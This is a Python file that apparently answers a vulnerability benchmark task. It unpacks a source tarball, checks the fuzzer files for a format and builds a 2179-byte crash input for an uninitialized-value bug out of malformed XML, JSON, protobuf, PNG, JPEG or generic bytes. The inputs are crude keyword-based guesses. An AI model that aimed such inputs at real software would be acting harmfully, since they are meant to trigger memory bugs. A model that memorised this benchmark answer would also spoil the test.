import tarfile
import os
import tempfile
import subprocess
import hashlib
from pathlib import Path
import random
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to analyze the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for common fuzzer entry points and analyze the format
            poc = self._generate_poc_from_analysis(tmpdir)
            
            if poc:
                return poc
            
            # Fallback: generate a generic PoC that often triggers uninitialized reads
            return self._generate_generic_poc()
    
    def _generate_poc_from_analysis(self, extracted_dir: str) -> bytes:
        """Analyze extracted source to generate targeted PoC."""
        try:
            # Look for fuzzer entry points
            for root, dirs, files in os.walk(extracted_dir):
                for file in files:
                    if file.endswith(('.cc', '.cpp', '.c')) and 'fuzz' in file.lower():
                        filepath = os.path.join(root, file)
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Check for common parsing patterns
                            if 'libxml' in content or 'XML' in content:
                                return self._generate_xml_poc()
                            elif 'json' in content.lower():
                                return self._generate_json_poc()
                            elif 'protobuf' in content.lower() or 'proto' in content:
                                return self._generate_protobuf_poc()
                            elif 'png' in content.lower():
                                return self._generate_png_poc()
                            elif 'jpeg' in content.lower() or 'jpg' in content.lower():
                                return self._generate_jpeg_poc()
        except:
            pass
        
        return None
    
    def _generate_xml_poc(self) -> bytes:
        """Generate XML that may trigger uninitialized attribute parsing."""
        # Create XML with malformed attributes and undefined entities
        poc = b'<?xml version="1.0"?>\n'
        poc += b'<!DOCTYPE test [\n'
        poc += b'  <!ENTITY undefined "&undeclared;">\n'
        poc += b']>\n'
        poc += b'<root>\n'
        
        # Add elements with attributes that might fail conversion
        for i in range(50):
            poc += f'  <element attr1="&undefined;" attr2="{chr(0)}value" '.encode('utf-8')
            poc += f'attr3="{"x" * 100}" attr4="123{"\x00" * 10}456"/>\n'.encode('utf-8')
        
        poc += b'</root>'
        
        # Pad to target length
        return self._pad_to_length(poc, 2179)
    
    def _generate_json_poc(self) -> bytes:
        """Generate JSON with conversion issues."""
        poc = b'{"'
        poc += b'a' * 500
        poc += b'":'
        
        # Create deeply nested structure with conversion issues
        poc += b'{"b":'
        poc += b'[' * 100
        poc += b'null'
        poc += b',' * 50
        poc += b'true'
        poc += b',' * 50
        poc += b'false'
        poc += b',' * 50
        poc += b'"' + b'\x00' * 100 + b'"'
        poc += b']' * 100
        
        poc += b',"c":'
        poc += b'{' * 50
        poc += b'"d":"' + b'\xff' * 100 + b'"'
        poc += b'}' * 50
        poc += b'}'
        
        return self._pad_to_length(poc, 2179)
    
    def _generate_protobuf_poc(self) -> bytes:
        """Generate malformed protobuf data."""
        # Create a mix of valid and invalid field data
        poc = bytearray()
        
        # Add some valid field headers
        for i in range(1, 100):
            field_num = i
            wire_type = random.randint(0, 5)  # Include invalid wire types
            key = (field_num << 3) | wire_type
            poc.extend(self._encode_varint(key))
            
            # Add malformed data based on wire type
            if wire_type == 0:  # varint
                poc.extend(b'\x80\x80\x80\x80\x80\x80\x80\x80\x80\x80')  # Overlong
            elif wire_type == 1:  # 64-bit
                poc.extend(b'\x00' * 8)
            elif wire_type == 2:  # length-delimited
                length = random.randint(0, 255)
                poc.extend(self._encode_varint(length))
                poc.extend(b'\x00' * min(length, 100))
            else:  # Invalid wire types
                poc.extend(b'\xff' * 10)
        
        # Ensure exact length
        poc = bytes(poc[:2179])
        if len(poc) < 2179:
            poc += b'\x00' * (2179 - len(poc))
        
        return poc
    
    def _generate_png_poc(self) -> bytes:
        """Generate PNG with malformed chunks."""
        # PNG signature
        poc = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk
        poc += struct.pack('>I', 13)  # Length
        poc += b'IHDR'
        poc += struct.pack('>I', 100)  # Width
        poc += struct.pack('>I', 100)  # Height
        poc += b'\x08\x02\x00\x00\x00'  # Bit depth, color type, compression, filter, interlace
        poc += struct.pack('>I', 0)  # CRC (wrong)
        
        # Create IDAT with problematic data
        poc += struct.pack('>I', 1000)
        poc += b'IDAT'
        poc += b'\x00' * 500  # Some valid data
        poc += b'\xff' * 500  # More data
        poc += struct.pack('>I', 0)  # CRC
        
        # Add tEXt chunk with null bytes
        text_data = b'Attribute\x00\x00\x00Value\x00\x00'
        poc += struct.pack('>I', len(text_data))
        poc += b'tEXt'
        poc += text_data
        poc += struct.pack('>I', 0)
        
        # Add unknown chunk that might cause attribute issues
        poc += struct.pack('>I', 50)
        poc += b'aTTb'  # Looks like attribute chunk
        poc += b'\x00' * 50
        poc += struct.pack('>I', 0)
        
        return self._pad_to_length(poc, 2179)
    
    def _generate_jpeg_poc(self) -> bytes:
        """Generate JPEG with malformed segments."""
        # Start of image
        poc = b'\xff\xd8'
        
        # Application segment with problematic data
        poc += b'\xff\xe0'
        poc += struct.pack('>H', 20)  # Length
        poc += b'JFIF\x00\x01\x01'
        poc += b'\x00' * 10
        
        # Comment with null bytes
        poc += b'\xff\xfe'
        comment = b'Attribute: \x00\x00Value: \xff\xfe'
        poc += struct.pack('>H', len(comment) + 2)
        poc += comment
        
        # DQT with odd length
        poc += b'\xff\xdb'
        poc += struct.pack('>H', 67)
        poc += b'\x00' + bytes(range(64))
        
        # Start of frame with suspicious dimensions
        poc += b'\xff\xc0'
        poc += struct.pack('>H', 17)
        poc += b'\x08'  # Precision
        poc += struct.pack('>H', 0)  # Height (0 is invalid)
        poc += struct.pack('>H', 0)  # Width (0 is invalid)
        poc += b'\x03'  # Components
        poc += b'\x01\x22\x00\x02\x11\x01\x03\x11\x01'
        
        # SOS with bad data
        poc += b'\xff\xda'
        poc += struct.pack('>H', 12)
        poc += b'\x03\x01\x00\x02\x11\x03\x11\x00?\x00'
        
        # Add scan data with problematic patterns
        poc += b'\x00' * 500
        poc += b'\xff' * 500
        
        return self._pad_to_length(poc, 2179)
    
    def _generate_generic_poc(self) -> bytes:
        """Generate generic PoC for uninitialized value vulnerabilities."""
        # Create data with patterns that often trigger uninitialized reads
        poc = bytearray()
        
        # Alternating pattern to create allocation/initialization issues
        pattern1 = b'A' * 128
        pattern2 = b'\x00' * 128
        pattern3 = b'\xff' * 128
        pattern4 = b'\x01' * 128
        
        for i in range(5):
            poc.extend(pattern1)
            poc.extend(pattern2)
            poc.extend(pattern3)
            poc.extend(pattern4)
        
        # Add some structured data that might be parsed
        poc.extend(b'attr=')
        poc.extend(b'\x00' * 100)
        poc.extend(b'&value=')
        poc.extend(b'\xff' * 100)
        
        # Add some numeric data that might fail conversion
        for i in range(20):
            poc.extend(f'num{i}='.encode())
            poc.extend(b'\x00' * 10)
            poc.extend(b';')
        
        # Add some malformed UTF-8 sequences
        poc.extend(b'\xc0\x80')  # Overlong encoding
        poc.extend(b'\xf5\x80\x80\x80')  # Invalid code point
        poc.extend(b'\xed\xa0\x80')  # Surrogate
        
        # Add null-terminated strings with extra nulls
        poc.extend(b'key1\0\0\0value1\0\0\0')
        poc.extend(b'key2\0\0\0value2\0\0\0')
        
        return self._pad_to_length(bytes(poc), 2179)
    
    def _encode_varint(self, value: int) -> bytes:
        """Encode integer as varint."""
        result = bytearray()
        while value > 127:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)
    
    def _pad_to_length(self, data: bytes, target_len: int) -> bytes:
        """Pad or truncate data to exact length."""
        if len(data) < target_len:
            # Pad with pattern that might trigger more issues
            pad_len = target_len - len(data)
            pad_pattern = b'\x00\xff\x00\xff' * (pad_len // 4 + 1)
            return data + pad_pattern[:pad_len]
        elif len(data) > target_len:
            return data[:target_len]
        return data